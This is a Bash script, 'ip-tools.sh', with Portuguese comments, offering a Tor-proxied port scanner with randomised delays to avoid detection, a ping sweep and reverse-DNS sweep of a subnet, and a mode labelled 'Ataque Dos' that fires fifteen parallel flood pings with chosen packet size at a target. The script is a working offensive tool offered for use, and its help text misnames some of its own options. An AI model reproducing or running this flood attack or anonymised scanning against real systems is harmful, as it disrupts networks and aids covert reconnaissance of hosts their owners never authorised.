#!/bin/bash

echo ""
echo "                                     / \  "
echo "             /\                     /   | "
echo " / \        / /                    /    / "
echo " \  \      / /                    /    / "
echo "  \  \    / /                    /    / "
echo "   \  \  / /                    /    / "
echo "    \  \/_/_ip-tools.sh V.1.0__/    / "
echo "     \/                         \  / "
echo "     (  o              o  )      )  "
echo "      \ intagram: @rafael_cyber1 / "

# Função para capturar a interrupção (Ctrl+C) e matar todos os pings
trap "kill 0" SIGINT
ip=$2

if [ "$1" == "-port-scan" ]; then
  service tor start
  # Usando xargs para rodar até 3 processos simultaneamente
  for port in $(cat wordlists/top_portas.txt); do
     result=$(proxychains4 nc -zv -w 2 "$ip" "$port" 2>&1 | grep -i "open" | sed 's/: Operation now in progress//' | sed 's/\[[^]]*\]//g' | sed 's/open//') # -w especifica o tempo limite
     if [ -n "$result" ]; then
       echo -e "\033[0;32m[OPEN] $result\033[0m"
     fi
     sleep $(( RANDOM % 3 + 1)) # pausa aleatória de 1 a 3 segundos
  done
  service tor stop

elif [ "$1" == "-rede-scan" ]; then
  for p in $(seq 1 255); do
     result=$(ping -c 1 -W 1 "$ip$p" | grep "64 bytes" | cut -d " " -f 4 | tr -d ":")
     if [ -n "$result" ]; then
       echo -e "\033[0;32m[IP] $result\033[0m"
     fi &
     sleep 1

     # cut -d " " -f 4: cut seleciona o 4º campo
     # tr -d ":": Remove os dois pontos (:) da string
     # & no final significa que cada ping será executado em segundo plano
  done

elif [ "$1" == "-dns" ]; then
  for p in $(seq 1 255); do # seq sinaliza uma sequencia de 1 a 255
     result=$(host "$ip$p" 2>&1 | grep -i "domain name pointer" | sed 's/domain name pointer//')
     if [ -n "$result" ]; then
       echo -e "\033[0;32m[DNS] $result\033[0m"
     fi
    sleep 2 # adciona 2 de espera.
  done

elif [ "$1" == "-dos" ]; then
  bytes=$3 # Define o número de bytes enviados
  # Executando múltiplos pings em paralelo
  for i in $(seq 1 15); do
      sudo nice -n -20 ping -f -s "$bytes" "$ip" &
  done
  wait # Espera todas as operações em segundo plano terminarem
  # nice ajusta a prioridade de execução
  # nice ajusta a prioridade de execução
  # -20 maior prioridade, mais recursos de CPU
  # -s é usada para especificar o tamanho do pacote de dados
  # em modo de inundação (-f), ou seja, de forma muito rápida, sem aguardar pelas respostas.

elif [ "$1" == "-h" ]; then
  echo -e "\nScanner de portas: ip-tools -port-sacn [IP]"
  echo -e "\nScan de rede: ip-tools.sh -scan-rede [IP exemplo: 10.0.0.] "
  echo -e "\nScanner de DNS: ip-tools.sh -dns [IP exemplo: 10.0.0. ]"
  echo -e "\nAtaque Dos: ip-tools.sh -dos [IP] [número de bytes aqui]\n"
fi
